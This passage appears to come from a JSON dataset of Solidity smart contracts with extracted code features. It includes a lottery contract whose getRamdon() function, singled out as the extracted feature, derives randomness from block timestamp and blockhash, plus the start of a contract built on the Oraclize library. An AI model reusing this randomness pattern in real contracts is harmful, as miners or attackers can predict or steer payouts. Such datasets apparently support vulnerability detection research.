= addressArray[index];\n uint totalBalace = address(this).balance;\n uint giveToOwn = totalBalace * curConfig.pumpRate / 100;\n uint giveToActor = totalBalace - giveToOwn;\n owner.transfer(giveToOwn);\n lastAddress.transfer(giveToActor);\n emit gameOverEvent(\n gameIndex,\n curConfig.totalSize,\n curConfig.singlePrice,\n curConfig.pumpRate,\n lastAddress,\n now);\n }\n function getRamdon() private view returns (uint) {\n bytes32 ramdon = keccak256(abi.encodePacked(ramdon,now,blockhash(block.number-1)));\n for(uint i = 0; i < addressArray.length; i++) {\n ramdon = keccak256(abi.encodePacked(ramdon,now, addressArray[i]));\n }\n uint index = uint(ramdon) % addressArray.length;\n return index;\n }\n}",
  "extract_feature": [
    "function getRamdon() private view returns (uint) {\nbytes32 ramdon = keccak256(abi.encodePacked(ramdon,now,blockhash(block.number-1)));\nfor(uint i = 0; i < addressArray.length; i++) {\nramdon = keccak256(abi.encodePacked(ramdon,now, addressArray[i]));\n}\nuint index = uint(ramdon) % addressArray.length;\nreturn index;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b37"
  },
  "filename": "1966.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n if (_a == 0) {\n return 0;\n }\n c = _a * _b;\n assert(c / _a == _b);\n return c;\n }\n function div(uint256 _a, uint256 _b) internal pure returns (uint256) {\n return _a / _b;\n }\n function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\n assert(_b <= _a);\n return _a - _b;\n }\n function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n c = _a + _b;\n assert(c >= _a);\n return c;\n }\n}\npragma solidity ^0.4.24;\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\npragma solidity >=0.4.18;\ncontract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) external payable returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) external payable returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) public payable returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) external payable returns (bytes32 _id);\n function queryN(uint _timestamp, string _datasource, bytes _argN) public payable returns (bytes32 _id);\n function queryN_withGasLimit(uint _timestamp, string _datasource, bytes _argN, uint _gaslimit) external payable returns (bytes32 _id);\n function getPrice(string _datasource) public returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) public returns (uint _dsprice);\n function setProofType(byte _proofType) external;\n function setCustomGasPrice(uint _gasPrice) external;\n function randomDS_getSessionPubKeyHash() external constant returns(bytes32);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() public returns (address _addr);\n}\nlibrary Buffer {\n struct buffer {\n bytes buf;\n uint capacity;\n }\n function init(buffer memory buf, uint _capacity) internal pure {\n uint capacity = _capacity;\n if(capacity % 32 != 0) capacity += 32 - (capacity % 32);\n buf.capacity = capacity;\n assembly {\n let ptr := mload(0x40)\n mstore(buf, ptr)\n mstore(ptr, 0)\n mstore(0x40, add(ptr, capacity))\n }\n }\n function resize(buffer memory buf, uint capacity) private pure {\n bytes memory oldbuf = buf.buf;\n init(buf, capacity);\n append(buf, oldbuf);\n }\n function max(uint a, uint b) private pure returns(uint) {\n if(a > b) {\n return a;\n }\n return b;\n }\n function append(buffer memory buf, bytes data) internal pure returns(buffer memory) {\n if(data.length + buf.buf.length > buf.capacity) {\n resize(buf, max(buf.capacity, data.length) * 2);\n }\n uint dest;\n uint src;\n uint len = data.length;\n assembly {\n let bufptr := mload(buf)\n let buflen := mload(bufptr)\n dest := add(add(bufptr, buflen), 32)\n mstore(bufptr, add(buflen, mload(data)))\n src := add(data, 32)\n }\n for(; len >= 32; len -= 32) {\n assembly {\n mstore(dest, mload(src))\n }\n dest += 32;\n src += 32;\n }\n uint mask = 256 ** (32 - len) - 1;\n assembly {\n let srcpart := and(mload(src), not(mask))\n let destpart := and(mload(dest), mask)\n mstore(dest, or(destpart, srcpart))\n }\n return buf;\n }\n function append(buffer memory buf, uint8 data) internal pure {\n if(buf.buf.length + 1 > buf.capacity) {\n resize(buf, buf.capacity * 2);\n }\n assembly {\n let bufptr := mload(buf)\n let buflen := mload(bufptr)\n let dest := add(add(bufptr, buflen), 32)\n mstore8(dest, data)\n mstore(bufptr, add(buflen, 1))\n }\n }\n function appendInt(buffer memory buf, uint data, uint len) internal pure returns(buffer memory) {\n if(len + buf.buf.length > buf.capacity) {\n resize(buf, max(buf.capacity, len) * 2);\n }\n uint mask = 256 ** len - 1;\n assembly {\n let bufptr := mload(buf)\n let buflen := mload(bufptr)\n let dest := add(add(bufptr, buflen), len)\n mstore(dest, or(and(mload(dest), not(mask)), data))\n mstore(bufptr, add(buflen, len))\n }\n return buf;\n }\n}\nlibrary CBOR {\n using Buffer for Buffer.buffer;\n uint8 private constant MAJOR_TYPE_INT = 0;\n uint8 private constant MAJOR_TYPE_NEGATIVE_INT = 1;\n uint8 private constant MAJOR_TYPE_BYTES = 2;\n uint8 private constant MAJOR_TYPE_STRING = 3;\n uint8 private constant MAJOR_TYPE_ARRAY = 4;\n uint8 private constant MAJOR_TYPE_MAP = 5;\n uint8 private constant MAJOR_TYPE_CONTENT_FREE = 7;\n function encodeType(Buffer.buffer memory buf, uint8 major, uint value) private pure {\n if(value <= 23) {\n buf.append(uint8((major << 5) | value));\n } else if(value <= 0xFF) {\n buf.append(uint8((major << 5) | 24));\n buf.appendInt(value, 1);\n } else if(value <= 0xFFFF) {\n buf.append(uint8((major << 5) | 25));\n buf.appendInt(value, 2);\n } else if(value <= 0xFFFFFFFF) {\n buf.append(uint8((major << 5) | 26));\n buf.appendInt(value, 4);\n } else if(value <= 0xFFFFFFFFFFFFFFFF) {\n buf.append(uint8((major << 5) | 27));\n buf.appendInt(value, 8);\n }\n }\n function encodeIndefiniteLengthType(Buffer.buffer memory buf, uint8 major) private pure {\n buf.append(uint8((major << 5) | 31));\n }\n function encodeUInt(Buffer.buffer memory buf, uint value) internal pure {\n encodeType(buf, MAJOR_TYPE_INT, value);\n }\n function encodeInt(Buffer.buffer memory buf, int value) internal pure {\n if(value >= 0) {\n encodeType(buf, MAJOR_TYPE_INT, uint(value));\n } else {\n encodeType(buf, MAJOR_TYPE_NEGATIVE_INT, uint(-1 - value));\n }\n }\n function encodeBytes(Buffer.buffer memory buf, bytes value) internal pure {\n encodeType(buf, MAJOR_TYPE_BYTES, value.length);\n buf.append(value);\n }\n function encodeString(Buffer.buffer memory buf, string value) internal pure {\n encodeType(buf, MAJOR_TYPE_STRING, bytes(value).length);\n buf.append(bytes(value));\n }\n function startArray(Buffer.buffer memory buf) internal pure {\n encodeIndefiniteLengthType(buf, MAJOR_TYPE_ARRAY);\n }\n function startMap(Buffer.buffer memory buf) internal pure {\n encodeIndefiniteLengthType(buf, MAJOR_TYPE_MAP);\n }\n function endSequence(Buffer.buffer memory buf) internal pure {\n encodeIndefiniteLengthType(buf, MAJOR_TYPE_CONTENT_FREE);\n }\n}\ncontract usingOraclize {\n uint constant day = 60*60*24;\n uint constant week = 60*60*24*7;\n uint constant month = 60*60*24*30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofType_Ledger = 0x30;\n byte constant proofType_Android = 0x40;\n byte constant proofType_Native = 0xF0;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n if((address(OAR)==0)||(getCodeSize(address(OAR))==0))\n oraclize_setNetwork(networkID_auto);\n if(address(oraclize) != OAR.getAddress())\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n _;\n }\n function oraclize_setNetwork(uint8 networkID) internal returns(bool){\n return oraclize_setNetwork();\n networkID;\n }\n function oraclize_setNetwork() internal returns(bool){\n if (getCodeSize(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed)>0){\n OAR = OraclizeAddrResolverI(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed);\n oraclize_setNetworkName(\"eth_mainnet\");\n return true;\n }\n if (getCodeSize(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1)>0){\n OAR = OraclizeAddrResolverI(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1);\n oraclize_setNetworkName(\"eth_ropsten3\");\n return true;\n }\n if (getCodeSize(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e)>0){\n OAR = OraclizeAddrResolverI(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e);\n oraclize_setNetworkName(\"eth_kovan\");\n return true;\n }\n if (getCodeSize(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48)>0){\n OAR = OraclizeAddrResolverI(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48);\n oraclize_setNetworkName(\"eth_rinkeby\");\n return true;\n }\n if (getCodeSize(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475)>0){\n OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475);\n return true;\n }\n if (getCodeSize(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF)>0){\n OAR = OraclizeAddrResolverI(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF);\n return true;\n }\n if (getCodeSize(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA)>0){\n OAR = OraclizeAddrResolverI(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA);\n return true;\n }\n return false;\n }\n function __callback(bytes32 myid, string result) public {\n __callback(myid, result, new bytes(0));\n }\n function __callback(bytes32 myid, string result, bytes proof) public {\n return;\n myid; result; proof;\n }\n function oraclize_getPrice(string datasource) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource);\n }\n function oraclize_getPrice(string datasource, uint gaslimit) oraclizeAPI internal returns (uint){\n return oraclize.getPrice(datasource, gaslimit);\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = stra2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n string[] memory dynargs = new string[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(0, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN.value(price)(timestamp, datasource, args);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n bytes memory args = ba2cbor(argN);\n return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](1);\n dynargs[0] = args[0];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](2);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](3);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](4);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs);\n }\n function oraclize_query(uint timestamp, string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(timestamp, datasource, dynargs, gaslimit);\n }\n function oraclize_query(string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {\n bytes[] memory dynargs = new bytes[](5);\n dynargs[0] = args[0];\n dynargs[1] = args[1];\n dynargs[2] = args[2];\n dynargs[3] = args[3];\n dynargs[4] = args[4];\n return oraclize_query(datasource, dynargs, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function oraclize_setCustomGasPrice(uint gasPrice) oraclizeAPI internal {\n return oraclize.setCustomGasPrice(gasPrice);\n }\n function oraclize_randomDS_getSessionPubKeyHash() oraclizeAPI internal returns (bytes32){\n return oraclize.randomDS_getSessionPubKeyHash();\n }\n function getCodeSize(address _addr) constant internal returns(uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal pure returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 65)&&(b1 <= 70)) b1 -= 55;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 65)&&(b2 <= 70)) b2 -= 55;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal pure returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return -1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return -1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal pure returns (int) {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if(h.length < 1 || n.length < 1 || (n.length > h.length))\n return -1;\n else if(h.length > (2**128 -1))\n return -1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if(subindex == n.length)\n return int(i);\n }\n }\n return -1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal pure returns (string) {\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal pure returns (string) {\n return strConcat(_a, _b, _c, 